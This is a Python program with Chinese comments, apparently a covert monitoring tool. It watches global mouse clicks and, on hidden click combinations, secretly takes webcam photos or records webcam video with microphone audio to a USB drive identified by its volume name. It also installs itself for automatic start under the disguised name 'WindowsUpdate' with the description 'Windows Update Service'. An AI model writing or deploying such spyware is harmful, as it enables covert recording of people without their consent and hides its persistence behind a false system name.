import os
import cv2
import time
from pynput import mouse
from pynput.mouse import Button, Listener
import threading
import psutil
import ctypes
import sys
import shutil
import pyaudio
import wave
import subprocess
import tempfile

class ComputerMonitor:
    def __init__(self):
        self.left_pressed = False
        self.right_pressed = False
        self.last_photo_time = 0
        self.photo_cooldown = 1
        self.is_capturing = False
        
        self.left_click_count = 0
        self.right_click_count = 0
        self.last_click_time = 0
        self.click_timeout = 0.5
        self.is_recording = False
        self.video_writer = None
        self.recording_camera = None
        
        # 音频录制相关变量
        self.audio_frames = []
        self.audio_stream = None
        self.audio_interface = None
        self.audio_filename = None
        
        # 添加开机自启动
        self.add_to_startup()
    
    def add_to_startup(self):
        """将程序添加到开机自启动"""
        try:
            # 获取当前程序路径
            if getattr(sys, 'frozen', False):
                # 如果是打包后的exe文件
                current_path = sys.executable
            else:
                # 如果是python脚本
                current_path = os.path.abspath(__file__)
            
            # 获取启动文件夹路径
            startup_folder = os.path.join(
                os.path.expanduser("~"),
                "AppData",
                "Roaming",
                "Microsoft",
                "Windows",
                "Start Menu",
                "Programs",
                "Startup"
            )
            
            # 创建快捷方式
            shortcut_name = "WindowsUpdate.lnk"
            shortcut_path = os.path.join(startup_folder, shortcut_name)
            
            # 如果快捷方式不存在，则创建
            if not os.path.exists(shortcut_path):
                # 方法1: 使用python创建快捷方式
                try:
                    import winshell
                    winshell.CreateShortcut(
                        Path=shortcut_path,
                        Target=current_path,
                        Icon=(current_path, 0),
                        Description="Windows Update Service"
                    )
                    print(f"已创建开机自启动快捷方式: {shortcut_path}")
                except ImportError:
                    # 方法2: 如果没有winshell，复制文件到启动文件夹
                    try:
                        if getattr(sys, 'frozen', False):
                            # 对于exe文件，直接复制
                            shutil.copy2(current_path, os.path.join(startup_folder, "WindowsUpdate.exe"))
                        else:
                            # 对于py文件，创建bat文件
                            bat_content = f'@echo off\npython "{current_path}"'
                            bat_path = os.path.join(startup_folder, "WindowsUpdate.bat")
                            with open(bat_path, 'w') as f:
                                f.write(bat_content)
                        print(f"已添加到开机自启动: {startup_folder}")
                    except Exception as e:
                        print(f"创建开机自启动失败: {e}")
            
        except Exception as e:
            print(f"设置开机自启动时出错: {e}")
    
    def find_usb_drive(self):
        try:
            for partition in psutil.disk_partitions():
                if 'removable' in partition.opts or ('cdrom' not in partition.opts and not partition.fstype == ''):
                    try:
                        drive_name = self.get_drive_name(partition.device)
                        if drive_name and 'xing' in drive_name.lower():
                            return partition.mountpoint
                    except:
                        continue
            return None
        except Exception as e:
            print(f"查找U盘错误: {e}")
            return None
    
    def get_drive_name(self, drive_letter):
        try:
            volume_name_buffer = ctypes.create_unicode_buffer(1024)
            file_system_name_buffer = ctypes.create_unicode_buffer(1024)
            success = ctypes.windll.kernel32.GetVolumeInformationW(
                ctypes.c_wchar_p(drive_letter),
                volume_name_buffer,
                ctypes.sizeof(volume_name_buffer),
                None,
                None,
                None,
                file_system_name_buffer,
                ctypes.sizeof(file_system_name_buffer)
            )
            if success:
                return volume_name_buffer.value
        except:
            pass
        return None
    
    def capture_photo(self):
        camera = None
        try:
            self.is_capturing = True
            
            for camera_index in [0, 1]:
                camera = cv2.VideoCapture(camera_index)
                if camera.isOpened():
                    break
                else:
                    if camera:
                        camera.release()
                    camera = None
            
            if not camera:
                return False
            
            time.sleep(0.5)
            
            ret, frame = camera.read()
            if ret:
                usb_drive = self.find_usb_drive()
                if usb_drive:
                    photo_folder = os.path.join(usb_drive, "Monitor_Photos")
                    if not os.path.exists(photo_folder):
                        os.makedirs(photo_folder)
                    
                    timestamp = time.strftime("%Y%m%d_%H%M%S")
                    filename = f"monitor_photo_{timestamp}.jpg"
                    filepath = os.path.join(photo_folder, filename)
                    
                    cv2.imwrite(filepath, frame)
                    
                    self.last_photo_time = time.time()
                    return True
                else:
                    pass
            else:
                pass
                
        except Exception as e:
            pass
        finally:
            self.is_capturing = False
            if camera:
                camera.release()
        return False
    
    def start_audio_recording(self):
        """开始录制音频"""
        try:
            self.audio_interface = pyaudio.PyAudio()
            
            # 音频参数
            chunk = 1024
            sample_format = pyaudio.paInt16
            channels = 2
            fs = 44100  # 采样率
            
            self.audio_stream = self.audio_interface.open(
                format=sample_format,
                channels=channels,
                rate=fs,
                frames_per_buffer=chunk,
                input=True
            )
            
            self.audio_frames = []
            return True
            
        except Exception as e:
            print(f"音频录制启动失败: {e}")
            return False
    
    def record_audio(self):
        """录制音频的线程函数"""
        try:
            while self.is_recording and self.audio_stream is not None:
                data = self.audio_stream.read(1024)
                self.audio_frames.append(data)
        except Exception as e:
            print(f"音频录制错误: {e}")
    
    def save_audio_file(self, filename):
        """保存音频为WAV文件"""
        try:
            sample_format = pyaudio.paInt16
            channels = 2
            fs = 44100
            
            wf = wave.open(filename, 'wb')
            wf.setnchannels(channels)
            wf.setsampwidth(self.audio_interface.get_sample_size(sample_format))
            wf.setframerate(fs)
            wf.writeframes(b''.join(self.audio_frames))
            wf.close()
            return True
        except Exception as e:
            print(f"保存音频文件失败: {e}")
            return False
    
    def merge_audio_video(self, video_file, audio_file, output_file):
        """使用FFmpeg合并音频和视频"""
        try:
            # 检查ffmpeg是否可用
            try:
                subprocess.run(["ffmpeg", "-version"], capture_output=True)
                ffmpeg_available = True
            except:
                ffmpeg_available = False
                print("FFmpeg不可用，无法合并音频")
                return False
            
            # 使用FFmpeg合并音频和视频
            cmd = [
                "ffmpeg",
                "-i", video_file,
                "-i", audio_file,
                "-c:v", "copy",
                "-c:a", "aac",
                "-strict", "experimental",
                output_file
            ]
            
            result = subprocess.run(cmd, capture_output=True, text=True)
            if result.returncode == 0:
                # 删除临时文件
                try:
                    os.remove(video_file)
                    os.remove(audio_file)
                except:
                    pass
                return True
            else:
                print(f"合并失败: {result.stderr}")
                return False
                
        except Exception as e:
            print(f"合并音频视频时出错: {e}")
            return False
    
    def start_recording(self):
        try:
            # 启动摄像头
            self.recording_camera = cv2.VideoCapture(0)
            if not self.recording_camera.isOpened():
                self.recording_camera = cv2.VideoCapture(1)
                if not self.recording_camera.isOpened():
                    return False
            
            frame_width = int(self.recording_camera.get(cv2.CAP_PROP_FRAME_WIDTH))
            frame_height = int(self.recording_camera.get(cv2.CAP_PROP_FRAME_HEIGHT))
            fps = 20.0
            
            usb_drive = self.find_usb_drive()
            if not usb_drive:
                return False
            
            video_folder = os.path.join(usb_drive, "Monitor_Videos")
            if not os.path.exists(video_folder):
                os.makedirs(video_folder)
            
            timestamp = time.strftime("%Y%m%d_%H%M%S")
            
            # 临时视频文件（无音频）
            temp_video_filename = f"temp_video_{timestamp}.avi"
            temp_video_filepath = os.path.join(video_folder, temp_video_filename)
            
            # 最终输出文件（有音频）
            final_filename = f"monitor_video_{timestamp}.mp4"
            final_filepath = os.path.join(video_folder, final_filename)
            
            fourcc = cv2.VideoWriter_fourcc(*'XVID')
            self.video_writer = cv2.VideoWriter(temp_video_filepath, fourcc, fps, (frame_width, frame_height))
            
            if not self.video_writer.isOpened():
                return False            
            
            # 启动音频录制
            if not self.start_audio_recording():
                print("音频录制启动失败，将继续录制无声视频")
            
            self.is_recording = True
            
            # 启动视频录制线程
            video_thread = threading.Thread(target=self.record_video)
            video_thread.daemon = True
            video_thread.start()
            
            # 启动音频录制线程
            if self.audio_stream:
                audio_thread = threading.Thread(target=self.record_audio)
                audio_thread.daemon = True
                audio_thread.start()
            
            return True
            
        except Exception as e:
            print(f"开始录制失败: {e}")
            return False
    
    def record_video(self):
        try:
            while self.is_recording and self.recording_camera is not None and self.video_writer is not None:
                ret, frame = self.recording_camera.read()
                if ret:
                    self.video_writer.write(frame)
                else:
                    break
                time.sleep(0.01)
        except Exception as e:
            print(f"视频录制错误: {e}")
    
    def stop_recording(self):
        try:
            self.is_recording = False
            
            # 停止视频录制
            if self.video_writer is not None:
                self.video_writer.release()
                self.video_writer = None
            
            if self.recording_camera is not None:
                self.recording_camera.release()
                self.recording_camera = None
            
            # 停止音频录制
            if self.audio_stream is not None:
                self.audio_stream.stop_stream()
                self.audio_stream.close()
                self.audio_interface.terminate()
                
                # 获取文件路径信息
                usb_drive = self.find_usb_drive()
                if usb_drive:
                    video_folder = os.path.join(usb_drive, "Monitor_Videos")
                    timestamp = time.strftime("%Y%m%d_%H%M%S")
                    
                    # 保存音频文件
                    temp_audio_filename = f"temp_audio_{timestamp}.wav"
                    temp_audio_filepath = os.path.join(video_folder, temp_audio_filename)
                    
                    # 最终视频文件
                    final_filename = f"monitor_video_{timestamp}.mp4"
                    final_filepath = os.path.join(video_folder, final_filename)
                    
                    # 临时视频文件
                    temp_video_filename = f"temp_video_{timestamp}.avi"
                    temp_video_filepath = os.path.join(video_folder, temp_video_filename)
                    
                    # 保存音频并合并
                    if self.save_audio_file(temp_audio_filepath):
                        # 在后台线程中合并音频视频
                        merge_thread = threading.Thread(
                            target=self.merge_audio_video, 
                            args=(temp_video_filepath, temp_audio_filepath, final_filepath)
                        )
                        merge_thread.daemon = True
                        merge_thread.start()
                    else:
                        # 如果音频保存失败，重命名视频文件
                        try:
                            os.rename(temp_video_filepath, final_filepath)
                        except:
                            pass
            
        except Exception as e:
            print(f"停止录制时出错: {e}")
    
    def on_click(self, x, y, button, pressed):
        current_time = time.time()
        
        if button == Button.left:
            self.left_pressed = pressed
        elif button == Button.right:
            self.right_pressed = pressed
        
        if (self.left_pressed and self.right_pressed and 
            current_time - self.last_photo_time > self.photo_cooldown and
            not self.is_capturing and not self.is_recording):
            
            photo_thread = threading.Thread(target=self.capture_photo)
            photo_thread.daemon = True
            photo_thread.start()
            
            self.left_pressed = False
            self.right_pressed = False
        
        if not pressed:
            return
        
        if current_time - self.last_click_time > self.click_timeout:
            self.left_click_count = 0
            self.right_click_count = 0
        
        self.last_click_time = current_time
        
        if button == Button.left:
            self.left_click_count += 1
        elif button == Button.right:
            self.right_click_count += 1
        
        if self.left_click_count >= 2 and self.right_click_count >= 2:
            if not self.is_recording and not self.is_capturing:
                success = self.start_recording()
                if success:
                    self.left_click_count = 0
                    self.right_click_count = 0
                    self.left_pressed = False
                    self.right_pressed = False
            elif self.is_recording:
                self.stop_recording()
                self.left_click_count = 0
                self.right_click_count = 0
                self.left_pressed = False
                self.right_pressed = False
    
    def start_monitoring(self):
        print("开始")
        print("1. 同时按下鼠标左右键可以拍照")
        print(f"   拍照完成后有{self.photo_cooldown}秒冷却时间")
        print("2. 按两次左键和两次右键开始录像")
        print("   再次按两次左键和两次右键停止录像")
        
        with Listener(on_click=self.on_click) as listener:
            listener.join()

if __name__ == "__main__":
    monitor = ComputerMonitor()
    monitor.start_monitoring()